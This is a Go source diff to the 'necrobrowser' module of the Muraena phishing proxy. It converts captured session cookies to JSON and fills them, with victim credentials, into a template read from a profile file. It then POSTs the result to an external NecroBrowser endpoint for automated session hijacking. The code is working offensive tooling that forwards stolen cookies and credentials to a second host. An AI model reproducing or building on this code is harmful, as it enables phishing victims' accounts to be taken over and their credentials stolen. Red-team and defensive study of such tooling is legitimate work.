@@ -2,7 +2,10 @@ package necrobrowser
 
 import (
 	"encoding/json"
-	"fmt"
+	"io/ioutil"
+	"net/http"
+	"strings"
+	"time"
 
 	"gopkg.in/resty.v1"
 
@@ -18,6 +21,10 @@ const (
 
 	// Author of this module
 	Author = "Muraena Team"
+
+	// Placeholders for templates
+	CookiePlaceholder      = "%%%COOKIES%%%"
+	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
 )
 
 // Necrobrowser module
@@ -26,38 +33,28 @@ type Necrobrowser struct {
 
 	Enabled  bool
 	Endpoint string
-	Token    string
-	Portal   string
+	Profile  string
+
+	Request string
 }
 
-type InstrumentNecrobrowser struct {
-	// gSuite, github
-	Provider string `json:"provider" binding:"required"`
-
-	DebuggingPort int `json:"debugPort" binding:"required"`
-
-	// classic credentials including 2fa token if any
-	Username string `json:"username"`
-	Password string `json:"password"`
-	Token    string `json:"token"`
-
-	// cookie jar
-	SessionCookies []SessionCookie `json:"sessionCookies"`
-
-	// keywords to search if target is a webmail or in general search bars
-	// for example: password, credentials, vpn, etc..
-	Keywords []string `json:"keywords"`
-}
-
-// SessionCookie type is needed to interact with NecroBrowser
+// Cookies
 type SessionCookie struct {
 	Name     string `json:"name"`
 	Value    string `json:"value"`
 	Domain   string `json:"domain"`
-	Expires  string `json:"expires"`
+	Expires  int64  `json:"expirationDate"`
 	Path     string `json:"path"`
 	HTTPOnly bool   `json:"httpOnly"`
 	Secure   bool   `json:"secure"`
+	Session  bool   `json:"session"`
+}
+
+// VictimCredentials structure
+type VictimCredentials struct {
+	Key   string
+	Value string
+	Time  time.Time
 }
 
 // Name returns the module name
@@ -93,21 +90,55 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 
 	config := s.Config.NecroBrowser
 	m.Endpoint = config.Endpoint
-	m.Portal = config.Profile
-	m.Token = config.Token
+
+	m.Profile = config.Profile
+	bytes, err := ioutil.ReadFile(m.Profile)
+	if err != nil {
+		m.Warning("Error reading profile file %s: %s", m.Profile, err)
+		m.Enabled = false
+		return
+	}
+
+	m.Request = string(bytes)
+
 	return
 }
 
-func (module *Necrobrowser) InstrumentNecroBrowser(instrument *InstrumentNecrobrowser) (err error) {
+func (module *Necrobrowser) Instrument(cookieJar []http.Cookie, credentialsJSON string) {
 
-	b, err := json.MarshalIndent(instrument, "", "\t")
-	if err == nil {
-		module.Warning("Instrumenting NecroBrowser:")
-		module.Warning(string(b))
+	var necroCookies []SessionCookie
+	for _, c := range cookieJar {
+
+		nc := SessionCookie{
+			Name:     c.Name,
+			Value:    c.Value,
+			Domain:   c.Domain,
+			Expires:  c.Expires.Unix(),
+			Path:     c.Path,
+			HTTPOnly: c.HttpOnly,
+			Secure:   c.Secure,
+			Session:  c.Expires.Unix() < 1,
+		}
+
+		necroCookies = append(necroCookies, nc)
 	}
 
-	url := fmt.Sprintf("%s/%s/%s", module.Endpoint, "instrument", module.Token)
-	resp, err := resty.R().SetBody(instrument).Post(url)
+	c, err := json.MarshalIndent(necroCookies, "", "\t")
+	if err != nil {
+		module.Warning("Error marshalling the cookies: %s", err)
+		return
+	}
+
+	cookiesJSON := string(c)
+	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
+	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)
+
+	client := resty.New()
+	resp, err := client.R().
+		SetHeader("Content-Type", "application/json").
+		SetBody(module.Request).
+		Post(module.Endpoint)
+
 	if err != nil {
 		return
 	}
